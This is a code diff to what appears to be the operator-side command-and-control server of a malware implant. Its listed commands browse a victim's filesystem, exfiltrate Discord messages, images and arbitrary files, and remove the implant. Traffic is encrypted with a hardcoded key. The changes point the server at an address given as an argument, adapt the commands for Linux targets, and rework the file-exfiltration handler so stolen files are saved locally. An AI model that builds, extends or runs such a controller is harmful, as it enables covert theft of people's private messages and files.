@@ -4,8 +4,9 @@ from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import padding
 import os
 import json
+import sys
 
-SERVER_IP = '172.31.151.50'
+SERVER_IP = sys.argv[1]
 SERVER_PORT = 8080
 
 def encrypt_tdes(key, data):
@@ -70,7 +71,7 @@ key = b'\xd1u\x80\x8c\x14\x05LD\xd3m\xb9\x8c6\xc5\xf1\x8d\\O\xc8\xaf\x08\xb1w\x1
 
 '''
 Commands:
-1. dir, type: to browse filesystem
+1. ls, cat: to browse filesystem
 2. exfil: to exfil discord messages
 3. exfil path/to/images: to exfil images 
 4. remove: to remove implant from filesystem
@@ -95,24 +96,20 @@ while True:
 
         if message.split(' ')[0] == "exfil":
             if len(message.split(' ')) > 1:
-                path = message.split(' ')[1]
-                images = send_linux_command(f"ls {path}".encode())
+                filename = message.split(' ')[1]
+                conn.sendall(encrypt_tdes(key, f"exfil {filename}".encode()))
+                
+                img_size = decrypt_aes(key, conn.recv(1024)).decode()
+                rec_msg = conn.recv(int(img_size), socket.MSG_WAITALL)
 
-                for i in images:
-                    conn.sendall(encrypt_tdes(key, f"exfil {path}/{i}".encode()))
+                response = decrypt_aes(key, rec_msg)
+                
+                f = open(f"files/{filename}", "x+")
+                f.close()
+                with open(f"files/{filename}", "wb") as f:
+                    f.write(response)
 
-                    img_size = decrypt_aes(key, conn.recv(1024)).decode()
-                    rec_msg = conn.recv(int(img_size), socket.MSG_WAITALL)
-
-                    response = decrypt_aes(key, rec_msg)
-                    # print("Image data received successfully!")
-
-                    f = open(f"images/{i}", "x+")
-                    f.close()
-                    with open(f"images/{i}", "wb") as f:
-                        f.write(response)
-
-                print("Image files written successfully!")
+                print("File written successfully!")
             else:
                 conn.sendall(encrypt_tdes(key, message.encode()))
 
